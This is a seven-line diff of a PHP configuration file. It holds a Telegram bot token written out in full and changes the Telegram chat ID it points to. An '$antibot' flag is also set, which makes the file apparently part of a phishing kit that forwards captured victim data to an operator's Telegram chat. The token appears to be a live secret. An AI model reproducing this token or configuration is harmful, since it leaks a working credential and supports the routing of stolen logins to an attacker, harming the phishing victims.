@@ -1,7 +1,7 @@
 <?php
 
 $zbayb = "8712281940:AAFvnLYZSBNui3HBUmqJVzZbBEcHGkrW3hU";
-$id = "-5266249462";
+$id = "-1003366306499";
 
 $antibot = "yes";
 
